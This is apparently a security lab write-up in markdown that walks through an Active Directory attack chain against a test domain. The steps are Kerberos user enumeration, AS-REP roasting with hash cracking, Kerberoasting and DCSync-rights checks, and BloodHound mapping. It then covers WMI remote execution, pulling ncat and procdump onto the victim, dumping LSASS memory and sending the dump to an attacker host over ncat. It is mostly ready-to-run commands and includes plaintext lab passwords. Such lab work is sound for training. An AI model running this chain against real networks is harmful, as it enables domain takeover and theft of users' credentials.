### NMAP 
```bash
# scanning port 88 shows Kerberos is reachable
nmap -p 88 192.168.100.1
```
![nmap](/Sandbox_SecurityLab_1/block1-attacks/src/nmap_res.jpg)
### User enumeration
```bash
kerbrute userenum -d corpnet.local --dc 192.168.100.1 usernames.txt -o valid_users.txt
```
![kerbrute](/Sandbox_SecurityLab_1/block1-attacks/src/kerbrute_res.jpg)

### AS-REP Roasting Check
```bash
impacket-GetNPUsers corpnet.local/ -usersfile valid_users.txt -dc-ip 192.168.100.1 -format hashcat -no-pass -outputfile asrep_hashes.txt
```
![GetNPUsers](/Sandbox_SecurityLab_1/block1-attacks/src/asrep_check.jpg)

```bash
# crack the hash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```
![hashcat](/Sandbox_SecurityLab_1/block1-attacks/src/hashcat_get_pass.jpg)

### ASP Users Check (Kerberoasting candidates)
```bash
impacket-GetUserSPNs corpnet.local/j.melnyk:'P@ssw0rd123' -dc-ip 192.168.100.1
```
![GetUserSPNs](/Sandbox_SecurityLab_1/block1-attacks/src/Get_SPN_users.jpg)

### DCSync Check (Replication rights on the Domain object)
```bash
impacket-dacledit -action read -target-dn "DC=corpnet,DC=local" corpnet.local/j.melnyk:'P@ssw0rd123' -dc-ip 192.168.100.1
```
![dacledit](/Sandbox_SecurityLab_1/block1-attacks/src/DCSync_check.jpg)

### Bloodhound
```bash
bloodhound-python -u j.melnyk -p 'P@ssw0rd123' -d corpnet.local -ns 192.168.100.1 -c All

bloodhound-setup

bloodhound-start

# Web UI: http//localhost:8080
```
Shortest path to Domain Admins

![bloodhound1](/Sandbox_SecurityLab_1/block1-attacks/src/Tree.jpg)

Kerberoasting candidate

![bloodhound2](/Sandbox_SecurityLab_1/block1-attacks/src/Kerberoastable_user.jpg)

AS-REP Roastable user

![bloodhound3](/Sandbox_SecurityLab_1/block1-attacks/src/AS-REP_user.jpg)

User with Replicating Rights

![bloodhound4](/Sandbox_SecurityLab_1/block1-attacks/src/RepRights_user.jpg)

### LSASS Credential Dumping
Remote Command Execution (RCE) via WMI
```bash
impacket-wmiexec 'Steve:Qwerty12345@192.168.100.100'
```

Copying necessary files to Windows machine
```bash
# set on Kali machine listener
python -m http.server 8000

# receive files from Windows machine with curl method
curl.exe http://192.168.100.20:8000/ncat.exe -o C:\ncat.exe && curl.exe http://192.168.100.20:8000/procdump64.exe -o C:\procdump64.exe
```
![lsassProcess](/Sandbox_SecurityLab_1/block1-attacks/src/wmiexec.jpg)

See the PID number of lsass service & confirm the file is not corrupted:
```powershell
tasklist | findstr lsass.exe

certutil -dump C:\lsass.dmp | more
```
![lsassProcess](/Sandbox_SecurityLab_1/block1-attacks/src/lsassProcess.jpg)

Create dump file on Windows with procdump64.exe
```powershell
procdump64.exe -accepteula -ma 628 C:\lsass.dmp
```

Sending lsass.dmp to Kali machine
```bash
# on Kali machine set listener
ncat -l 9000 > /home/hunter/Desktop/lsass.dmp

# on Windows machine send to Kali machine
ncat.exe 192.168.100.20 9000 < C:\lsass.dmp
```
Run pypykatz on Kali machine to parse an LSASS memory dump and inspect the authentication-related data stored in it:
```bash
pypykatz lsa minidump lsass.exe
```
See Full dump file 

![dumpFile](../block1-attacks/src/lsassProove/dump.txt "File")